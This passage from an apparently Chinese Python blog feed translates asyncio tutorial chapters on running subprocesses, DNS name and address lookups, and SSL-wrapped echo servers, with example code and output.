class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_exited</span><span class="params">(self)</span>:</span></div><div class="line">    print(<span class="string">'process exited'</span>)</div><div class="line">    return_code = self.transport.get_returncode()</div><div class="line">    print(<span class="string">'return code &#123;&#125;'</span>.format(return_code))</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> return_code:</div><div class="line">        cmd_output = bytes(self.buffer).decode()</div><div class="line">        results = self._parse_results(cmd_output)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        results = []</div><div class="line">    self.done.set_result((return_code, results))</div></pre></td></tr></table></figure></p><p>命令输出被解析成一系列字典，将每个输出行的标题名称映射到它们的值，并返回结果列表。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_parse_results</span><span class="params">(self, output)</span>:</span></div><div class="line">    print(<span class="string">'parsing results'</span>)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> output:</div><div class="line">        <span class="keyword">return</span> []</div><div class="line">    lines = output.splitlines()</div><div class="line">    headers = lines[<span class="number">0</span>].split()</div><div class="line">    devices = lines[<span class="number">1</span>:]</div><div class="line">    results = [</div><div class="line">        dict(zip(headers, line.split()))</div><div class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> devices</div><div class="line">    ]</div><div class="line">    <span class="keyword">return</span> results</div></pre></td></tr></table></figure></p><p>run_df()协程使用run_until_complete()运行，然后检查结果并打印每个设备上的可用空间。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    return_code, results = event_loop.run_until_complete(</div><div class="line">        run_df(event_loop)</div><div class="line">    )</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div><div class="line"></div><div class="line"><span class="keyword">if</span> return_code:</div><div class="line">    print(<span class="string">'error exit &#123;&#125;'</span>.format(return_code))</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    print(<span class="string">'\nFree space:'</span>)</div><div class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> results:</div><div class="line">        print(<span class="string">'&#123;Mounted:25&#125;: &#123;Avail&#125;'</span>.format(**r))</div></pre></td></tr></table></figure></p><p>下面的输出显示了所用步骤的顺序，以及运行系统的三个驱动器上的可用空间。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_subprocess_protocol.py</div><div class="line"></div><div class="line"><span class="keyword">in</span> run_df</div><div class="line">launching process</div><div class="line">process started <span class="number">49675</span></div><div class="line">waiting <span class="keyword">for</span> process to complete</div><div class="line">read <span class="number">332</span> bytes <span class="keyword">from</span> stdout</div><div class="line">process exited</div><div class="line"><span class="keyword">return</span> code <span class="number">0</span></div><div class="line">parsing results</div><div class="line"></div><div class="line">Free space:</div><div class="line">/                        : <span class="number">233</span>Gi</div><div class="line">/Volumes/hubertinternal  : <span class="number">157</span>Gi</div><div class="line">/Volumes/hubert-tm      : <span class="number">2.3</span>Ti</div></pre></td></tr></table></figure></p><h3 id="使用协程和流子进程"><a href="#使用协程和流子进程" class="headerlink" title="使用协程和流子进程"></a>使用协程和流子进程</h3><p>要使用协程直接运行进程，而不是通过协议子类访问它，调用create_subprocess_exec()并指定哪个stdout，stderr和stdin连接到管道。协程生成子进程的结果是一个Process实例，可用于操纵子进程或与之进行通信。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> asyncio.subprocess</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">run_df</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'in run_df'</span>)</div><div class="line"></div><div class="line">    buffer = bytearray()</div><div class="line"></div><div class="line">    create = asyncio.create_subprocess_exec(</div><div class="line">        <span class="string">'df'</span>, <span class="string">'-hl'</span>,</div><div class="line">        stdout=asyncio.subprocess.PIPE,</div><div class="line">    )</div><div class="line">    print(<span class="string">'launching process'</span>)</div><div class="line">    proc = <span class="keyword">await</span> create</div><div class="line">    print(<span class="string">'process started &#123;&#125;'</span>.format(proc.pid))</div></pre></td></tr></table></figure></p><p>在这个例子中，除了命令行参数外，df不需要任何输入，所以下一步就是读取所有的输出。有了Protocol，就无法控制一次读取多少数据。这个例子使用readline()，但是它也可以直接调用read()来读取不是面向行的数据。与协议示例一样，该命令的输出被缓冲，因此可以稍后进行解析。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    line = <span class="keyword">await</span> proc.stdout.readline()</div><div class="line">    print(<span class="string">'read &#123;!r&#125;'</span>.format(line))</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> line:</div><div class="line">        print(<span class="string">'no more output from command'</span>)</div><div class="line">        <span class="keyword">break</span></div><div class="line">    buffer.extend(line)</div></pre></td></tr></table></figure></p><p>当程序运行完成没有更多的输出时，readline()方法返回一个空的字节字符串。为确保正确清理进程，下一步是等待进程完全退出。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">print(<span class="string">'waiting for process to complete'</span>)</div><div class="line"><span class="keyword">await</span> proc.wait()</div></pre></td></tr></table></figure></p><p>此时，可以检查退出状态，以确定是解析输出还是处理错误，因为它不产生输出。解析逻辑和前面的例子是一样的，但是是独立的函数（这里没有显示），因为没有协议类来隐藏它。在解析数据之后，返回结果和退出代码给来调用者。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">return_code = proc.returncode</div><div class="line">print(<span class="string">'return code &#123;&#125;'</span>.format(return_code))</div><div class="line"><span class="keyword">if</span> <span class="keyword">not</span> return_code:</div><div class="line">    cmd_output = bytes(buffer).decode()</div><div class="line">    results = _parse_results(cmd_output)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    results = []</div><div class="line"></div><div class="line"><span class="keyword">return</span> (return_code, results)</div></pre></td></tr></table></figure></p><p>主程序与基于协议的示例类似，因为实现更改在run_df()中是独立的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    return_code, results = event_loop.run_until_complete(</div><div class="line">        run_df()</div><div class="line">    )</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div><div class="line"></div><div class="line"><span class="keyword">if</span> return_code:</div><div class="line">    print(<span class="string">'error exit &#123;&#125;'</span>.format(return_code))</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    print(<span class="string">'\nFree space:'</span>)</div><div class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> results:</div><div class="line">        print(<span class="string">'&#123;Mounted:25&#125;: &#123;Avail&#125;'</span>.format(**r))</div></pre></td></tr></table></figure></p><p>由于df的输出可以一次读取一行，因此可以显示程序的进度。否则，输出看起来类似于前面的例子。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_subprocess_coroutine.py</div><div class="line"></div><div class="line"><span class="keyword">in</span> run_df</div><div class="line">launching process</div><div class="line">process started <span class="number">49678</span></div><div class="line">read <span class="string">b'Filesystem    Size  Used  Avail Capacity  iused</span></div><div class="line"><span class="string">ifree %iused  Mounted on\n'</span></div><div class="line">read <span class="string">b'/dev/disk2s2  446Gi  213Gi  233Gi    48%  55955082</span></div><div class="line"><span class="string">61015132  48%  /\n'</span></div><div class="line">read <span class="string">b'/dev/disk1    465Gi  307Gi  157Gi    67%  80514922</span></div><div class="line"><span class="string">41281172  66%  /Volumes/hubertinternal\n'</span></div><div class="line">read <span class="string">b'/dev/disk3s2  3.6Ti  1.4Ti  2.3Ti    38% 181837749</span></div><div class="line"><span class="string">306480579  37%  /Volumes/hubert-tm\n'</span></div><div class="line">read <span class="string">b''</span></div><div class="line">no more output <span class="keyword">from</span> command</div><div class="line">waiting <span class="keyword">for</span> process to complete</div><div class="line"><span class="keyword">return</span> code <span class="number">0</span></div><div class="line">parsing results</div><div class="line"></div><div class="line">Free space:</div><div class="line">/                        : <span class="number">233</span>Gi</div><div class="line">/Volumes/hubertinternal  : <span class="number">157</span>Gi</div><div class="line">/Volumes/hubert-tm      : <span class="number">2.3</span>Ti</div></pre></td></tr></table></figure></p><h3 id="发送数据到子进程"><a href="#发送数据到子进程" class="headerlink" title="发送数据到子进程"></a>发送数据到子进程</h3><p>前面的两个例子都只使用一个单独的通信通道从第二个进程读取数据。但是通常需要将数据发送到一个命令进行处理。这个例子定义了一个协程来执行Unix命令tr来转换输入流中的字符。在这种情况下，tr用于将小写字母转换为大写字母。to_upper()协程采用事件循环和输入字符串作为参数。它产生了第二个进程运行”tr [:lower:] [:upper:]”。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> asyncio.subprocess</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">to_upper</span><span class="params">(input)</span>:</span></div><div class="line">    print(<span class="string">'in to_upper'</span>)</div><div class="line"></div><div class="line">    create = asyncio.create_subprocess_exec(</div><div class="line">        <span class="string">'tr'</span>, <span class="string">'[:lower:]'</span>, <span class="string">'[:upper:]'</span>,</div><div class="line">        stdout=asyncio.subprocess.PIPE,</div><div class="line">        stdin=asyncio.subprocess.PIPE,</div><div class="line">    )</div><div class="line">    print(<span class="string">'launching process'</span>)</div><div class="line">    proc = <span class="keyword">await</span> create</div><div class="line">    print(<span class="string">'pid &#123;&#125;'</span>.format(proc.pid))</div></pre></td></tr></table></figure></p><p>接下来，to_upper()使用Process的communications()方法将输入字符串发送到命令，并异步读取所有得到的输出。跟ubprocess.Popen版本的方法一样，communications()返回完整的输出字节字符串。如果一个命令可能产生的数据比可以放进内存的数据更多或者输出必须逐步处理，那么输入就不能一次完成，可以直接使用Process的stdin，stdout和stderr句柄，而不用调用communic()。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">print(<span class="string">'communicating with process'</span>)</div><div class="line">stdout, stderr = <span class="keyword">await</span> proc.communicate(input.encode())</div></pre></td></tr></table></figure></p><p>I/O完成后，等待进程完全退出，确保正确清理。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">print(<span class="string">'waiting for process to complete'</span>)</div><div class="line"><span class="keyword">await</span> proc.wait()</div></pre></td></tr></table></figure></p><p>然后可以检查返回代码，并将输出字节字符串解码，以便从协程中准备返回值。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">return_code = proc.returncode</div><div class="line">print(<span class="string">'return code &#123;&#125;'</span>.format(return_code))</div><div class="line"><span class="keyword">if</span> <span class="keyword">not</span> return_code:</div><div class="line">    results = bytes(stdout).decode()</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    results = <span class="string">''</span></div><div class="line"></div><div class="line"><span class="keyword">return</span> (return_code, results)</div></pre></td></tr></table></figure></p><p>程序的主要部分建立一个要转换的消息字符串，然后设置事件循环来运行to_upper()并打印结果。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">MESSAGE = <span class="string">"""</span></div><div class="line"><span class="string">This message will be converted</span></div><div class="line"><span class="string">to all caps.</span></div><div class="line"><span class="string">"""</span></div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    return_code, results = event_loop.run_until_complete(</div><div class="line">        to_upper(MESSAGE)</div><div class="line">    )</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div><div class="line"></div><div class="line"><span class="keyword">if</span> return_code:</div><div class="line">    print(<span class="string">'error exit &#123;&#125;'</span>.format(return_code))</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    print(<span class="string">'Original: &#123;!r&#125;'</span>.format(MESSAGE))</div><div class="line">    print(<span class="string">'Changed : &#123;!r&#125;'</span>.format(results))</div></pre></td></tr></table></figure></p><p>输出显示操作的顺序，然后显示如何转换简单的文本消息。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_subprocess_coroutine_write.py</div><div class="line"></div><div class="line"><span class="keyword">in</span> to_upper</div><div class="line">launching process</div><div class="line">pid <span class="number">49684</span></div><div class="line">communicating <span class="keyword">with</span> process</div><div class="line">waiting <span class="keyword">for</span> process to complete</div><div class="line"><span class="keyword">return</span> code <span class="number">0</span></div><div class="line">Original: <span class="string">'\nThis message will be converted\nto all caps.\n'</span></div><div class="line">Changed : <span class="string">'\nTHIS MESSAGE WILL BE CONVERTED\nTO ALL CAPS.\n'</span></div></pre></td></tr></table></figure></p><p><strong>本文翻译自《The Python3 Standard Library By Example》asyncio相关章节</strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> asyncio </tag>
            
            <tag> 异步并发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>asyncio之与DNS服务进行交互</title>
      <link href="/2017/12/21/asyncio%E4%B9%8B%E4%B8%8EDNS%E6%9C%8D%E5%8A%A1%E8%BF%9B%E8%A1%8C%E4%BA%A4%E4%BA%92/"/>
      <url>/2017/12/21/asyncio%E4%B9%8B%E4%B8%8EDNS%E6%9C%8D%E5%8A%A1%E8%BF%9B%E8%A1%8C%E4%BA%A4%E4%BA%92/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>DNS服务进行交互</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>应用程序使用网络与服务器通信以进行域名服务（DNS）操作，例如在主机名和IP地址之间进行转换。asyncio在事件循环上有方便的方法来处理后台的这些操作，以避免在查询过程中被阻塞。</p><h3 id="按名称查询地址"><a href="#按名称查询地址" class="headerlink" title="按名称查询地址"></a>按名称查询地址</h3><p>使用协程getaddrinfo()将主机名和端口号转换为IP或IPv6地址。与socket模块中函数的版本一样，返回值是包含五条信息的元组列表。</p><ul><li>1.地址家族</li><li>2.地址类型</li><li>3.协议</li><li>4.服务器的规范名称</li><li>5.一个socket地址元组，适用于在最初指定的端口上打开到服务器的连接<br>查询可以按协议进行过滤，如本示例中所示，只返回TCP响应。<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> logging</div><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">TARGETS = [</div><div class="line">    (<span class="string">'pymotw.com'</span>, <span class="string">'https'</span>),</div><div class="line">    (<span class="string">'doughellmann.com'</span>, <span class="string">'https'</span>),</div><div class="line">    (<span class="string">'python.org'</span>, <span class="string">'https'</span>),</div><div class="line">]</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop, targets)</span>:</span></div><div class="line">    <span class="keyword">for</span> target <span class="keyword">in</span> targets:</div><div class="line">        info = <span class="keyword">await</span> loop.getaddrinfo(*target, proto=socket.IPPROTO_TCP,)</div><div class="line">        <span class="keyword">for</span> host <span class="keyword">in</span> info:</div><div class="line">            print(<span class="string">'&#123;:20&#125;: &#123;&#125;'</span>.format(target[<span class="number">0</span>], host[<span class="number">4</span>][<span class="number">0</span>]))</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_until_complete(main(event_loop, TARGETS))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></li></ul><p>示例程序将主机名和协议名称转换为IP地址和端口号。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_getaddrinfo.py</div><div class="line"></div><div class="line">pymotw.com          : <span class="number">66.33</span><span class="number">.211</span><span class="number">.242</span></div><div class="line">doughellmann.com    : <span class="number">66.33</span><span class="number">.211</span><span class="number">.240</span></div><div class="line">python.org          : <span class="number">23.253</span><span class="number">.135</span><span class="number">.79</span></div><div class="line">python.org          : <span class="number">2001</span>:<span class="number">4802</span>:<span class="number">7901</span>::e60a:<span class="number">1375</span>:<span class="number">0</span>:<span class="number">6</span></div></pre></td></tr></table></figure></p><h3 id="按地址查询名称"><a href="#按地址查询名称" class="headerlink" title="按地址查询名称"></a>按地址查询名称</h3><p>协程getnameinfo()工作方向则相反，在可能的情况下将IP地址转换为主机名和端口号为协议名称。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> logging</div><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">TARGETS = [</div><div class="line">    (<span class="string">'66.33.211.242'</span>, <span class="number">443</span>),</div><div class="line">    (<span class="string">'104.130.43.121'</span>, <span class="number">443</span>),</div><div class="line">]</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop, targets)</span>:</span></div><div class="line">    <span class="keyword">for</span> target <span class="keyword">in</span> targets:</div><div class="line">        info = <span class="keyword">await</span> loop.getnameinfo(target)</div><div class="line">        print(<span class="string">'&#123;:15&#125;: &#123;&#125; &#123;&#125;'</span>.format(target[<span class="number">0</span>], *info))</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_until_complete(main(event_loop, TARGETS))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>此示例显示pymotw.com的IP地址是位于运行站点的托管公司DreamHost上的服务器。查询的第二个IP地址是python.org，它不会解析回主机名。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_getnameinfo.py</div><div class="line"></div><div class="line"><span class="number">66.33</span><span class="number">.211</span><span class="number">.242</span>  : apache2-echo.catalina.dreamhost.com https</div><div class="line"><span class="number">104.130</span><span class="number">.43</span><span class="number">.121</span> : <span class="number">104.130</span><span class="number">.43</span><span class="number">.121</span> https</div></pre></td></tr></table></figure></p><p><strong>本文翻译自《The Python3 Standard Library By Example》asyncio相关章节</strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> asyncio </tag>
            
            <tag> 异步并发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>asyncio之使用SSL</title>
      <link href="/2017/12/21/asyncio%E4%B9%8B%E4%BD%BF%E7%94%A8SSL/"/>
      <url>/2017/12/21/asyncio%E4%B9%8B%E4%BD%BF%E7%94%A8SSL/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>使用SSL</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>asyncio内置支持在socket上启用SSL通信。将SSLContext实例传递给创建服务器或客户端连接的协程将启用该支持，并在socket准备好供应用程序使用之前，确保SSL协议设置得当。<br>来自上一节的基于协程的echo服务器和客户端将在这里进行一些小修改。第一步是创建证书和密钥文件。自签名证书可以使用如下命令创建：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ openssl req -newkey rsa:2048 -nodes -keyout pymotw.key -x509 -days 365 -out pymotw.crt</div></pre></td></tr></table></figure></p><p>openssl命令将提示用于生成证书的多个值，然后生成请求的输出文件。<br>在以前的服务器示例中，不安全的socket设置使用start_server()来创建监听socket。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">factory = asyncio.start_server(echo, *SERVER_ADDRESS)</div><div class="line">server = event_loop.run_until_complete(factory)</div></pre></td></tr></table></figure></p><p>要添加加密，请使用刚刚生成的证书和密钥创建一个SSLContext，然后将该上下文传递给start_server()。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)</div><div class="line">ssl_context.check_hostname = <span class="keyword">False</span></div><div class="line">ssl_context.load_cert_chain(<span class="string">'pymotw.crt'</span>, <span class="string">'pymotw.key'</span>)</div><div class="line"></div><div class="line">factory = asyncio.start_server(echo, *SERVER_ADDRESS, ssl=ssl_context)</div></pre></td></tr></table></figure></p><p>客户端需要进行类似的更改。旧版本使用open_connection()来创建连接到服务器的socket。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reader, writer = <span class="keyword">await</span> asyncio.open_connection(*address)</div></pre></td></tr></table></figure></p><p>SSLContext需要再次保护socket的客户端。客户端身份没有被强制执行，所以只需要加载证书。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ssl_context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH,)</div><div class="line">ssl_context.check_hostname = <span class="keyword">False</span></div><div class="line">ssl_context.load_verify_locations(<span class="string">'pymotw.crt'</span>)</div><div class="line">reader, writer = <span class="keyword">await</span> asyncio.open_connection(*address, ssl=ssl_context)</div></pre></td></tr></table></figure></p><p>另外一个需要在客户端做一些修改的是，由于SSL连接不支持发送文件结尾（EOF），客户端将使用NULL字节作为消息终止符。<br>旧版本的客户端使用write_eof()发送循环。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> msg <span class="keyword">in</span> messages:</div><div class="line">    writer.write(msg)</div><div class="line">    log.debug(<span class="string">'sending &#123;!r&#125;'</span>.format(msg))</div><div class="line"><span class="keyword">if</span> writer.can_write_eof():</div><div class="line">    writer.write_eof()</div><div class="line"><span class="keyword">await</span> writer.drain()</div></pre></td></tr></table></figure></p><p>新版本发送0字节(b’\x00’)。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> msg <span class="keyword">in</span> messages:</div><div class="line">    writer.write(msg)</div><div class="line">    log.debug(<span class="string">'sending &#123;!r&#125;'</span>.format(msg))</div><div class="line">writer.write(<span class="string">b'\x00'</span>)</div><div class="line"><span class="keyword">await</span> writer.drain()</div></pre></td></tr></table></figure></p><p>服务器中的echo()协程必须查找NULL字节并在收到时关闭客户端连接。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">echo</span><span class="params">(reader, writer)</span>:</span></div><div class="line">    address = writer.get_extra_info(<span class="string">'peername'</span>)</div><div class="line">    log = logging.getLogger(<span class="string">'echo_&#123;&#125;_&#123;&#125;'</span>.format(*address))</div><div class="line">    log.debug(<span class="string">'connection accepted'</span>)</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        data = <span class="keyword">await</span> reader.read(<span class="number">128</span>)</div><div class="line">        terminate = data.endswith(<span class="string">b'\x00'</span>)</div><div class="line">        data = data.rstrip(<span class="string">b'\x00'</span>)</div><div class="line">        <span class="keyword">if</span> data:</div><div class="line">            log.debug(<span class="string">'received &#123;!r&#125;'</span>.format(data))</div><div class="line">            writer.write(data)</div><div class="line">            <span class="keyword">await</span> writer.drain()</div><div class="line">            log.debug(<span class="string">'sent &#123;!r&#125;'</span>.format(data))</div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data <span class="keyword">or</span> terminate:</div><div class="line">            log.debug(<span class="string">'message terminated, closing connection'</span>)</div><div class="line">            writer.close()</div><div class="line">            <span class="keyword">return</span></div></pre></td></tr></table></figure></p><p>在一个窗口中运行服务器，在另一个窗口中运行客户端，生成此输出。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_echo_server_ssl.py</div><div class="line">asyncio: Using selector: KqueueSelector</div><div class="line">main: starting up on localhost port <span class="number">10000</span></div><div class="line">echo_::<span class="number">1</span>_53957: connection accepted</div><div class="line">echo_::<span class="number">1</span>_53957: received <span class="string">b'This is the message. '</span></div><div 